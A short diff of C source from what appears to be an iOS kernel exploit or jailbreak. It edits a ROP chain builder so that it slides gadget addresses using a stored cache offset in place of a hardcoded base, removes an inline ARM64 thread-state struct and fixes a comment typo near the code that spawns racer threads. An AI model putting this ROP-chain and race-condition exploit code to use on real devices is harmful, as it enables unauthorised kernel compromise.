@@ -52,7 +52,7 @@ void build_chain(int fd, offset_struct_t* offsets, rop_var_t* ropvars)
             // slid it to the new address
             // we add and then subtract cause otherwise this could underflow
             buf += offsets->new_cache_addr;
-            buf -= 0x180000000;
+            buf -= offsets->old_cache_addr;
             // write it to the output/stack
             write(fd, &buf, 8);
             // increase the chain position so that we know where we are for the offset types
@@ -985,20 +985,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, offsets_t* lib_
     ROP_VAR_CPY_W_OFFSET("client", 0, "service_open_request", offsetof(struct ServiceOpen_Reply, connection.name), sizeof(mach_port_t));
 
     // spawn racer threads
-
-    // TODO: move this struct into a seperate file
-#define _STRUCT_ARM_THREAD_STATE64 struct __darwin_arm_thread_state64
-    _STRUCT_ARM_THREAD_STATE64
-    {
-        __uint64_t __x[29]; /* General purpose registers x0-x28 */
-        __uint64_t __fp; /* Frame pointer x29 */
-        __uint64_t __lr; /* Link register x30 */
-        __uint64_t __sp; /* Stack pointer x31 */
-        __uint64_t __pc; /* Program counter */
-        __uint32_t __cpsr; /* Current program status register */
-    };
-
-    // spawn the racer therad
+    // spawn the racer thread
     DEFINE_ROP_VAR("racer_kernel_thread", sizeof(thread_act_t), tmp);
     _STRUCT_ARM_THREAD_STATE64* new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
     memset(new_thread_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
